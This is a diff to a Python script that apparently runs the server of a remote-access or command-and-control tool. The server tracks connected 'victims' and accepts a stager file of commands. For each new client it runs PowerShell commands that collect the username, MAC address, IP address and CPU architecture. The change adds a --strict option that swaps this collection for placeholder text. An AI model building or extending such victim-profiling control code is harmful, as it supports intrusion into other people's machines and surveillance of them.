@@ -19,7 +19,7 @@ hotPlugPort = None
 selected = []
 
 def getInfo():
-    global stager, newest
+    global stager, newest, args
     old = 0
 
     while True:
@@ -27,12 +27,20 @@ def getInfo():
             newUID = s.connects[-1]
             control = s.client(newUID)
 
-            s.vicInfo[newUID] = {
-                "hostname": control.run("whoami"),
-                "mac": control.run("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress").replace("-", ":"),
-                "ip": control.run("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress"),
-                "arch": "x86" if control.run("(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64",
-            }
+            if args.strict == False:
+                s.vicInfo[newUID] = {
+                    "hostname": control.run("whoami"),
+                    "mac": control.run("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress").replace("-", ":"),
+                    "ip": control.run("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress"),
+                    "arch": "x86" if control.run("(Get-WmiObject -Class Win32_Processor).Architecture") == "0" else "x64",
+                }
+            else:
+                s.vicInfo[newUID] = {
+                    "hostname": "strict mode active",
+                    "mac": "strict mode active",
+                    "ip": "strict mode active",
+                    "arch": "strict mode active"
+                }
 
             if stager == None:
                 pass
@@ -142,6 +150,11 @@ if __name__ == '__main__':
                         help="a stager text file that executes commands from a text file, line by line (default: None)",
                         default=None)
     
+    parser.add_argument("--strict",
+                        help="disable information gathering commands",
+                        action="store_true",
+                        default=False)
+
     args = parser.parse_args()
     stager = args.stager
     srv = s.azamuku()
